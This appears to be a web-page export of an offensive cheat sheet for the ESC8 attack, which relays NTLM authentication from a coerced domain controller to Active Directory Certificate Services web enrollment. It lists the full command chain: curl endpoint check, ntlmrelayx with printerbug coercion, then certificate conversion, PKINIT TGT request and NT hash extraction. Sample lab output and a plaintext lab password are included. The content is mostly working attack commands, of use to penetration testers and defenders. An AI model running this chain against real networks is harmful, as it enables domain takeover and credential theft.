title: ESC8: NTLM Relay to AD CS HTTP
html:
Conditions: AD CS web enrollment HTTP endpoint accessible at http://<ca>/certsrv/, no Extended Protection for Authentication (EPA) or channel binding required.

Verify HTTP Endpoint

curl -I http://<ca-host>/certsrv/certfnsh.asp
curl -I http://braavos.essos.local/certsrv/certfnsh.asp

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM

Set Up NTLM Relay

# Terminal 1: Start ntlmrelayx
python3 ntlmrelayx.py -t http://<ca-host>/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"

# Terminal 2: Trigger auth from DC
python3 printerbug.py <domain>/<username>:<password>@<dc-host> <ca-host>
# Terminal 1
python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"

# Terminal 2 — trigger SpoolSS callback from DC
python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local

# ntlmrelayx output:
[*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled
HTTP  : success, Cert saved to /tmp/MEEREEN$cert.b64
[*] ADCS attack completed. Generated certificate for MEEREEN$

Use Machine Certificate

cat /tmp/<dc-host>cert.b64 | base64 -d > <dc-host>.pfx

gettgtpkinit.py <domain>/<dc-host>$ -pfx-file <dc-host>.pfx <dc-host>.ccache
cat /tmp/MEEREEN$cert.b64 | base64 -d > meereen.pfx

gettgtpkinit.py essos.local/meereen$ -pfx-file meereen.pfx meereen.ccache
[+] TGT request successful!
[*] Saved TGT to meereen.ccache

NTLM Hash Extraction from Machine TGT

export KRB5CCNAME=<dc-host>.ccache
getnthash.py -key <session-key> <domain>/<dc-host>$
excerpt: Conditions: AD CS web enrollment HTTP endpoint accessible at http://<ca>/certsrv/ , no Extended Protection for Authentication (EPA) or channel binding required. Verify HTTP Endpoint curl -I http
